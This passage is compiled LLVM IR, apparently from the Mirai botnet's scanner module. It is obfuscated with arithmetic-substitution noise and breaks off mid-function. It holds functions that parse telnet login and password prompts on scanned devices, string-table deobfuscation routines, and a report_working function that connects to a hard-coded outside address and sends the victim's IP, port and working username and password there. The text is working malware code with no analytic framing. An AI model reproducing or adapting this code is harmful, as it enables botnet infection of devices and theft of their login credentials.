; <label>:126:                                    ; preds = %125, %107
  br label %127

; <label>:127:                                    ; preds = %126
  %128 = load i32, i32* %5, align 4
  %129 = sub i32 %128, 1771373302
  %130 = add i32 %129, 1
  %131 = add i32 %130, 1771373302
  %132 = add nsw i32 %128, 1
  store i32 %131, i32* %5, align 4
  br label %96

; <label>:133:                                    ; preds = %96
  %134 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %135 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %134, i32 0, i32 1
  %136 = load i32, i32* %135, align 8
  %137 = load i8*, i8** %4, align 8
  %138 = call i64 @send(i32 %136, i8* %137, i64 3, i32 16384)
  %139 = load i8*, i8** %4, align 8
  %140 = getelementptr inbounds i8, i8* %139, i64 3
  store i8* %140, i8** %4, align 8
  %141 = load i32, i32* %3, align 4
  %142 = sub i32 %141, -897572321
  %143 = add i32 %142, 3
  %144 = add i32 %143, -897572321
  %145 = add nsw i32 %141, 3
  store i32 %144, i32* %3, align 4
  br label %146

; <label>:146:                                    ; preds = %133, %69
  br label %147

; <label>:147:                                    ; preds = %146
  br label %148

; <label>:148:                                    ; preds = %147, %23
  br label %149

; <label>:149:                                    ; preds = %148
  br label %11

; <label>:150:                                    ; preds = %94, %61, %33, %22, %11
  %151 = load i32, i32* %3, align 4
  ret i32 %151
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_user_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = add i32 %13, -1132349559
  %15 = sub i32 %14, 1
  %16 = sub i32 %15, -1132349559
  %17 = sub nsw i32 %13, 1
  store i32 %16, i32* %5, align 4
  br label %18

; <label>:18:                                     ; preds = %73, %1
  %19 = load i32, i32* %5, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %80

; <label>:21:                                     ; preds = %18
  %22 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %22, i32 0, i32 7
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %23, i64 0, i64 %25
  %27 = load i8, i8* %26, align 1
  %28 = sext i8 %27 to i32
  %29 = icmp eq i32 %28, 58
  br i1 %29, label %66, label %30

; <label>:30:                                     ; preds = %21
  %31 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %32 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %31, i32 0, i32 7
  %33 = load i32, i32* %5, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds [256 x i8], [256 x i8]* %32, i64 0, i64 %34
  %36 = load i8, i8* %35, align 1
  %37 = sext i8 %36 to i32
  %38 = icmp eq i32 %37, 62
  br i1 %38, label %66, label %39

; <label>:39:                                     ; preds = %30
  %40 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %41 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %40, i32 0, i32 7
  %42 = load i32, i32* %5, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds [256 x i8], [256 x i8]* %41, i64 0, i64 %43
  %45 = load i8, i8* %44, align 1
  %46 = sext i8 %45 to i32
  %47 = icmp eq i32 %46, 36
  br i1 %47, label %66, label %48

; <label>:48:                                     ; preds = %39
  %49 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %50 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %49, i32 0, i32 7
  %51 = load i32, i32* %5, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds [256 x i8], [256 x i8]* %50, i64 0, i64 %52
  %54 = load i8, i8* %53, align 1
  %55 = sext i8 %54 to i32
  %56 = icmp eq i32 %55, 35
  br i1 %56, label %66, label %57

; <label>:57:                                     ; preds = %48
  %58 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %59 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %58, i32 0, i32 7
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds [256 x i8], [256 x i8]* %59, i64 0, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp eq i32 %64, 37
  br i1 %65, label %66, label %72

; <label>:66:                                     ; preds = %57, %48, %39, %30, %21
  %67 = load i32, i32* %5, align 4
  %68 = add i32 %67, -486193868
  %69 = add i32 %68, 1
  %70 = sub i32 %69, -486193868
  %71 = add nsw i32 %67, 1
  store i32 %70, i32* %6, align 4
  br label %80

; <label>:72:                                     ; preds = %57
  br label %73

; <label>:73:                                     ; preds = %72
  %74 = load i32, i32* %5, align 4
  %75 = sub i32 0, %74
  %76 = sub i32 0, -1
  %77 = add i32 %75, %76
  %78 = sub i32 0, %77
  %79 = add nsw i32 %74, -1
  store i32 %78, i32* %5, align 4
  br label %18

; <label>:80:                                     ; preds = %66, %18
  %81 = load i32, i32* %6, align 4
  %82 = icmp eq i32 %81, -1
  br i1 %82, label %83, label %123

; <label>:83:                                     ; preds = %80
  call void @table_unlock_val(i8 zeroext 26)
  call void @table_unlock_val(i8 zeroext 27)
  %84 = call i8* @table_retrieve_val(i32 26, i32* %8)
  store i8* %84, i8** %9, align 8
  %85 = call i8* @table_retrieve_val(i32 27, i32* %8)
  store i8* %85, i8** %10, align 8
  %86 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %87 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %86, i32 0, i32 7
  %88 = getelementptr inbounds [256 x i8], [256 x i8]* %87, i32 0, i32 0
  %89 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %90 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %89, i32 0, i32 6
  %91 = load i32, i32* %90, align 4
  %92 = load i8*, i8** %9, align 8
  %93 = load i32, i32* %8, align 4
  %94 = add i32 %93, 269074092
  %95 = sub i32 %94, 1
  %96 = sub i32 %95, 269074092
  %97 = sub nsw i32 %93, 1
  %98 = call i32 @util_memsearch(i8* %88, i32 %91, i8* %92, i32 %96)
  %99 = icmp ne i32 %98, -1
  %100 = zext i1 %99 to i32
  store i32 %100, i32* %7, align 4
  br i1 %99, label %101, label %103

; <label>:101:                                    ; preds = %83
  %102 = load i32, i32* %7, align 4
  store i32 %102, i32* %6, align 4
  br label %122

; <label>:103:                                    ; preds = %83
  %104 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %105 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %104, i32 0, i32 7
  %106 = getelementptr inbounds [256 x i8], [256 x i8]* %105, i32 0, i32 0
  %107 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %108 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %107, i32 0, i32 6
  %109 = load i32, i32* %108, align 4
  %110 = load i8*, i8** %10, align 8
  %111 = load i32, i32* %8, align 4
  %112 = add i32 %111, -157283437
  %113 = sub i32 %112, 1
  %114 = sub i32 %113, -157283437
  %115 = sub nsw i32 %111, 1
  %116 = call i32 @util_memsearch(i8* %106, i32 %109, i8* %110, i32 %114)
  %117 = icmp ne i32 %116, -1
  %118 = zext i1 %117 to i32
  store i32 %118, i32* %7, align 4
  br i1 %117, label %119, label %121

; <label>:119:                                    ; preds = %103
  %120 = load i32, i32* %7, align 4
  store i32 %120, i32* %6, align 4
  br label %121

; <label>:121:                                    ; preds = %119, %103
  br label %122

; <label>:122:                                    ; preds = %121, %101
  br label %123

; <label>:123:                                    ; preds = %122, %80
  call void @table_lock_val(i8 zeroext 26)
  call void @table_lock_val(i8 zeroext 27)
  %124 = load i32, i32* %6, align 4
  %125 = icmp eq i32 %124, -1
  br i1 %125, label %126, label %127

; <label>:126:                                    ; preds = %123
  store i32 0, i32* %2, align 4
  br label %129

; <label>:127:                                    ; preds = %123
  %128 = load i32, i32* %6, align 4
  store i32 %128, i32* %2, align 4
  br label %129

; <label>:129:                                    ; preds = %127, %126
  %130 = load i32, i32* %2, align 4
  ret i32 %130
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_pass_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %10 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %11 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %10, i32 0, i32 6
  %12 = load i32, i32* %11, align 4
  %13 = sub i32 %12, 365375022
  %14 = sub i32 %13, 1
  %15 = add i32 %14, 365375022
  %16 = sub nsw i32 %12, 1
  store i32 %15, i32* %5, align 4
  br label %17

; <label>:17:                                     ; preds = %64, %1
  %18 = load i32, i32* %5, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %70

; <label>:20:                                     ; preds = %17
  %21 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %22 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %21, i32 0, i32 7
  %23 = load i32, i32* %5, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [256 x i8], [256 x i8]* %22, i64 0, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = icmp eq i32 %27, 58
  br i1 %28, label %56, label %29

; <label>:29:                                     ; preds = %20
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 7
  %32 = load i32, i32* %5, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds [256 x i8], [256 x i8]* %31, i64 0, i64 %33
  %35 = load i8, i8* %34, align 1
  %36 = sext i8 %35 to i32
  %37 = icmp eq i32 %36, 62
  br i1 %37, label %56, label %38

; <label>:38:                                     ; preds = %29
  %39 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %40 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %39, i32 0, i32 7
  %41 = load i32, i32* %5, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds [256 x i8], [256 x i8]* %40, i64 0, i64 %42
  %44 = load i8, i8* %43, align 1
  %45 = sext i8 %44 to i32
  %46 = icmp eq i32 %45, 36
  br i1 %46, label %56, label %47

; <label>:47:                                     ; preds = %38
  %48 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %49 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %48, i32 0, i32 7
  %50 = load i32, i32* %5, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [256 x i8], [256 x i8]* %49, i64 0, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp eq i32 %54, 35
  br i1 %55, label %56, label %63

; <label>:56:                                     ; preds = %47, %38, %29, %20
  %57 = load i32, i32* %5, align 4
  %58 = sub i32 0, %57
  %59 = sub i32 0, 1
  %60 = add i32 %58, %59
  %61 = sub i32 0, %60
  %62 = add nsw i32 %57, 1
  store i32 %61, i32* %6, align 4
  br label %70

; <label>:63:                                     ; preds = %47
  br label %64

; <label>:64:                                     ; preds = %63
  %65 = load i32, i32* %5, align 4
  %66 = add i32 %65, 1779766069
  %67 = add i32 %66, -1
  %68 = sub i32 %67, 1779766069
  %69 = add nsw i32 %65, -1
  store i32 %68, i32* %5, align 4
  br label %17

; <label>:70:                                     ; preds = %56, %17
  %71 = load i32, i32* %6, align 4
  %72 = icmp eq i32 %71, -1
  br i1 %72, label %73, label %93

; <label>:73:                                     ; preds = %70
  call void @table_unlock_val(i8 zeroext 25)
  %74 = call i8* @table_retrieve_val(i32 25, i32* %9)
  store i8* %74, i8** %7, align 8
  %75 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %76 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %75, i32 0, i32 7
  %77 = getelementptr inbounds [256 x i8], [256 x i8]* %76, i32 0, i32 0
  %78 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %79 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %78, i32 0, i32 6
  %80 = load i32, i32* %79, align 4
  %81 = load i8*, i8** %7, align 8
  %82 = load i32, i32* %9, align 4
  %83 = sub i32 %82, 1493371763
  %84 = sub i32 %83, 1
  %85 = add i32 %84, 1493371763
  %86 = sub nsw i32 %82, 1
  %87 = call i32 @util_memsearch(i8* %77, i32 %80, i8* %81, i32 %85)
  %88 = icmp ne i32 %87, -1
  %89 = zext i1 %88 to i32
  store i32 %89, i32* %8, align 4
  br i1 %88, label %90, label %92

; <label>:90:                                     ; preds = %73
  %91 = load i32, i32* %8, align 4
  store i32 %91, i32* %6, align 4
  br label %92

; <label>:92:                                     ; preds = %90, %73
  br label %93

; <label>:93:                                     ; preds = %92, %70
  call void @table_lock_val(i8 zeroext 25)
  %94 = load i32, i32* %6, align 4
  %95 = icmp eq i32 %94, -1
  br i1 %95, label %96, label %97

; <label>:96:                                     ; preds = %93
  store i32 0, i32* %2, align 4
  br label %99

; <label>:97:                                     ; preds = %93
  %98 = load i32, i32* %6, align 4
  store i32 %98, i32* %2, align 4
  br label %99

; <label>:99:                                     ; preds = %97, %96
  %100 = load i32, i32* %2, align 4
  ret i32 %100
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_any_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %7 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %8 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %7, i32 0, i32 6
  %9 = load i32, i32* %8, align 4
  %10 = sub i32 0, 1
  %11 = add i32 %9, %10
  %12 = sub nsw i32 %9, 1
  store i32 %11, i32* %5, align 4
  br label %13

; <label>:13:                                     ; preds = %69, %1
  %14 = load i32, i32* %5, align 4
  %15 = icmp sgt i32 %14, 0
  br i1 %15, label %16, label %75

; <label>:16:                                     ; preds = %13
  %17 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %18 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %17, i32 0, i32 7
  %19 = load i32, i32* %5, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds [256 x i8], [256 x i8]* %18, i64 0, i64 %20
  %22 = load i8, i8* %21, align 1
  %23 = sext i8 %22 to i32
  %24 = icmp eq i32 %23, 58
  br i1 %24, label %61, label %25

; <label>:25:                                     ; preds = %16
  %26 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %27 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %26, i32 0, i32 7
  %28 = load i32, i32* %5, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [256 x i8], [256 x i8]* %27, i64 0, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 62
  br i1 %33, label %61, label %34

; <label>:34:                                     ; preds = %25
  %35 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %36 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %35, i32 0, i32 7
  %37 = load i32, i32* %5, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [256 x i8], [256 x i8]* %36, i64 0, i64 %38
  %40 = load i8, i8* %39, align 1
  %41 = sext i8 %40 to i32
  %42 = icmp eq i32 %41, 36
  br i1 %42, label %61, label %43

; <label>:43:                                     ; preds = %34
  %44 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %45 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %44, i32 0, i32 7
  %46 = load i32, i32* %5, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds [256 x i8], [256 x i8]* %45, i64 0, i64 %47
  %49 = load i8, i8* %48, align 1
  %50 = sext i8 %49 to i32
  %51 = icmp eq i32 %50, 35
  br i1 %51, label %61, label %52

; <label>:52:                                     ; preds = %43
  %53 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %54 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %53, i32 0, i32 7
  %55 = load i32, i32* %5, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds [256 x i8], [256 x i8]* %54, i64 0, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = sext i8 %58 to i32
  %60 = icmp eq i32 %59, 37
  br i1 %60, label %61, label %68

; <label>:61:                                     ; preds = %52, %43, %34, %25, %16
  %62 = load i32, i32* %5, align 4
  %63 = sub i32 0, %62
  %64 = sub i32 0, 1
  %65 = add i32 %63, %64
  %66 = sub i32 0, %65
  %67 = add nsw i32 %62, 1
  store i32 %66, i32* %6, align 4
  br label %75

; <label>:68:                                     ; preds = %52
  br label %69

; <label>:69:                                     ; preds = %68
  %70 = load i32, i32* %5, align 4
  %71 = sub i32 %70, 1708821359
  %72 = add i32 %71, -1
  %73 = add i32 %72, 1708821359
  %74 = add nsw i32 %70, -1
  store i32 %73, i32* %5, align 4
  br label %13

; <label>:75:                                     ; preds = %61, %13
  %76 = load i32, i32* %6, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %79

; <label>:78:                                     ; preds = %75
  store i32 0, i32* %2, align 4
  br label %81

; <label>:79:                                     ; preds = %75
  %80 = load i32, i32* %6, align 4
  store i32 %80, i32* %2, align 4
  br label %81

; <label>:81:                                     ; preds = %79, %78
  %82 = load i32, i32* %2, align 4
  ret i32 %82
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_resp_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 zeroext 10)
  %7 = call i8* @table_retrieve_val(i32 10, i32* %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub i32 0, 1
  %17 = add i32 %15, %16
  %18 = sub nsw i32 %15, 1
  %19 = call i32 @util_memsearch(i8* %10, i32 %13, i8* %14, i32 %17)
  %20 = icmp ne i32 %19, -1
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %1
  call void @table_lock_val(i8 zeroext 10)
  store i32 -1, i32* %2, align 4
  br label %41

; <label>:22:                                     ; preds = %1
  call void @table_lock_val(i8 zeroext 10)
  call void @table_unlock_val(i8 zeroext 9)
  %23 = call i8* @table_retrieve_val(i32 9, i32* %6)
  store i8* %23, i8** %4, align 8
  %24 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %24, i32 0, i32 7
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %25, i32 0, i32 0
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 6
  %29 = load i32, i32* %28, align 4
  %30 = load i8*, i8** %4, align 8
  %31 = load i32, i32* %6, align 4
  %32 = sub i32 0, 1
  %33 = add i32 %31, %32
  %34 = sub nsw i32 %31, 1
  %35 = call i32 @util_memsearch(i8* %26, i32 %29, i8* %30, i32 %33)
  store i32 %35, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 9)
  %36 = load i32, i32* %5, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %39

; <label>:38:                                     ; preds = %22
  store i32 0, i32* %2, align 4
  br label %41

; <label>:39:                                     ; preds = %22
  %40 = load i32, i32* %5, align 4
  store i32 %40, i32* %2, align 4
  br label %41

; <label>:41:                                     ; preds = %39, %38, %21
  %42 = load i32, i32* %2, align 4
  ret i32 %42
}

; Function Attrs: noinline nounwind uwtable
define internal void @report_working(i32, i16 zeroext, %struct.scanner_auth*) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca %struct.scanner_auth*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %11 = alloca i8, align 1
  store i32 %0, i32* %4, align 4
  store i16 %1, i16* %5, align 2
  store %struct.scanner_auth* %2, %struct.scanner_auth** %6, align 8
  %12 = call i32 @fork() #6
  store i32 %12, i32* %8, align 4
  %13 = load i32, i32* %8, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %18, label %15

; <label>:15:                                     ; preds = %3
  %16 = load i32, i32* %8, align 4
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %18, label %19

; <label>:18:                                     ; preds = %15, %3
  ret void

; <label>:19:                                     ; preds = %15
  %20 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %20, i32* %9, align 4
  %21 = icmp eq i32 %20, -1
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %19
  call void @exit(i32 0) #8
  unreachable

; <label>:23:                                     ; preds = %19
  call void @table_unlock_val(i8 zeroext 2)
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call i32 @inet_addr(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.16, i32 0, i32 0)) #6
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %27 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %26, i32 0, i32 0
  store i32 %25, i32* %27, align 4
  %28 = call i8* @table_retrieve_val(i32 2, i32* null)
  %29 = bitcast i8* %28 to i16*
  %30 = load i16, i16* %29, align 2
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  call void @table_lock_val(i8 zeroext 2)
  %32 = load i32, i32* %9, align 4
  %33 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %34 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  store %struct.sockaddr* %34, %struct.sockaddr** %33, align 8
  %35 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %36 = load %struct.sockaddr*, %struct.sockaddr** %35, align 8
  %37 = call i32 @connect(i32 %32, %struct.sockaddr* %36, i32 16)
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %42

; <label>:39:                                     ; preds = %23
  %40 = load i32, i32* %9, align 4
  %41 = call i32 @close(i32 %40)
  call void @exit(i32 0) #8
  unreachable

; <label>:42:                                     ; preds = %23
  store i8 0, i8* %11, align 1
  %43 = load i32, i32* %9, align 4
  %44 = call i64 @send(i32 %43, i8* %11, i64 1, i32 16384)
  %45 = load i32, i32* %9, align 4
  %46 = bitcast i32* %4 to i8*
  %47 = call i64 @send(i32 %45, i8* %46, i64 4, i32 16384)
  %48 = load i32, i32* %9, align 4
  %49 = bitcast i16* %5 to i8*
  %50 = call i64 @send(i32 %48, i8* %49, i64 2, i32 16384)
  %51 = load i32, i32* %9, align 4
  %52 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %53 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %52, i32 0, i32 4
  %54 = call i64 @send(i32 %51, i8* %53, i64 1, i32 16384)
  %55 = load i32, i32* %9, align 4
  %56 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %57 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %56, i32 0, i32 0
  %58 = load i8*, i8** %57, align 8
  %59 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %60 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %59, i32 0, i32 4
  %61 = load i8, i8* %60, align 4
  %62 = zext i8 %61 to i64
  %63 = call i64 @send(i32 %55, i8* %58, i64 %62, i32 16384)
  %64 = load i32, i32* %9, align 4
  %65 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %66 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %65, i32 0, i32 5
  %67 = call i64 @send(i32 %64, i8* %66, i64 1, i32 16384)
  %68 = load i32, i32* %9, align 4
  %69 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %70 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %69, i32 0, i32 1
  %71 = load i8*, i8** %70, align 8
  %72 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %73 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %72, i32 0, i32 5
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i64
  %76 = call i64 @send(i32 %68, i8* %71, i64 %75, i32 16384)
  %77 = load i32, i32* %9, align 4
  %78 = call i32 @close(i32 %77)
  call void @exit(i32 0) #8
  unreachable
}

; Function Attrs: noinline nounwind uwtable
define internal signext i8 @can_consume(%struct.scanner_connection*, i8*, i32) #0 {
  %4 = alloca %struct.scanner_connection*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i8, i8* %10, i64 %14
  store i8* %15, i8** %7, align 8
  %16 = load i8*, i8** %5, align 8
  %17 = load i32, i32* %6, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  %20 = load i8*, i8** %7, align 8
  %21 = icmp ult i8* %19, %20
  %22 = zext i1 %21 to i32
  %23 = trunc i32 %22 to i8
  ret i8 %23
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

declare i64 @recv(i32, i8*, i64, i32) #3

declare void @util_zero(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define internal i8* @deobf(i8*, i32*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32* %1, i32** %4, align 8
  %7 = load i8*, i8** %3, align 8
  %8 = call i32 @util_strlen(i8* %7)
  %9 = load i32*, i32** %4, align 8
  store i32 %8, i32* %9, align 4
  %10 = load i32*, i32** %4, align 8
  %11 = load i32, i32* %10, align 4
  %12 = sub i32 0, 1
  %13 = sub i32 %11, %12
  %14 = add nsw i32 %11, 1
  %15 = sext i32 %13 to i64
  %16 = call noalias i8* @malloc(i64 %15) #6
  store i8* %16, i8** %6, align 8
  %17 = load i8*, i8** %6, align 8
  %18 = load i8*, i8** %3, align 8
  %19 = load i32*, i32** %4, align 8
  %20 = load i32, i32* %19, align 4
  %21 = sub i32 %20, -493085503
  %22 = add i32 %21, 1
  %23 = add i32 %22, -493085503
  %24 = add nsw i32 %20, 1
  call void @util_memcpy(i8* %17, i8* %18, i32 %23)
  store i32 0, i32* %5, align 4
  br label %25

; <label>:25:                                     ; preds = %98, %2
  %26 = load i32, i32* %5, align 4
  %27 = load i32*, i32** %4, align 8
  %28 = load i32, i32* %27, align 4
  %29 = icmp slt i32 %26, %28
  br i1 %29, label %30, label %104

; <label>:30:                                     ; preds = %25
  %31 = load i8*, i8** %6, align 8
  %32 = load i32, i32* %5, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
